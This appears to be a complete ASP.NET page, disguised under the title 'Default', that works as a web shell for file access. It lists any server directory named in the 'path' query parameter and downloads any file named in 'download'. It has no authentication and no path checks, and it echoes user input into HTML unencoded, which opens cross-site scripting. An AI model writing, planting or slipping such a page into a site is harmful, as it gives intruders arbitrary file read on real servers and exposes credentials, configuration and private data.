<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Linq" %>
<html>
<head>
    <title>Default</title>
</head>
<body>
    <%
        string inputPath = Request.QueryString["path"];
        string keyword = Request.QueryString["search"];
        string dirPath = string.IsNullOrEmpty(inputPath) ? Directory.GetCurrentDirectory() : inputPath;

        string downloadPath = Request.QueryString["download"];
        if (!string.IsNullOrEmpty(downloadPath) && File.Exists(downloadPath))
        {
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(downloadPath));
            Response.WriteFile(downloadPath);
            Response.End();
        }
    %>

    <h2>📂 current: <%= dirPath %></h2>

    <form method="get">
        <input type="text" name="path" value="<%= dirPath %>" style="width:50%;" placeholder="input path" />
        <input type="text" name="search" value="<%= keyword %>" placeholder="search" />
        <input type="submit" value="go" />
    </form>

    <p>
        <% if (Directory.GetParent(dirPath) != null) { %>
            <a href="?path=<%= HttpUtility.UrlEncode(Directory.GetParent(dirPath).FullName) %>">⬆ up</a>
        <% } %>
    </p>

    <ul>
        <%
            try
            {
                foreach (string dir in Directory.GetDirectories(dirPath))
                {
                    string folderName = Path.GetFileName(dir);
                    if (!string.IsNullOrEmpty(keyword) && !folderName.Contains(keyword, StringComparison.OrdinalIgnoreCase))
                        continue;

                    string link = "?path=" + HttpUtility.UrlEncode(dir);
        %>
                    <li>[📁] <a href="<%= link %>"><%= folderName %></a></li>
        <%
                }
                foreach (string file in Directory.GetFiles(dirPath))
                {
                    string fileName = Path.GetFileName(file);
                    if (!string.IsNullOrEmpty(keyword) && !fileName.Contains(keyword, StringComparison.OrdinalIgnoreCase))
                        continue;

                    string downloadLink = "?download=" + HttpUtility.UrlEncode(file);
        %>
                    <li>[📄] <a href="<%= downloadLink %>"><%= fileName %></a></li>
        <%
                }
            }
            catch (Exception ex)
            {
                Response.Write("<p style='color:red;'>error: " + ex.Message + "</p>");
            }
        %>
    </ul>
</body>
</html>
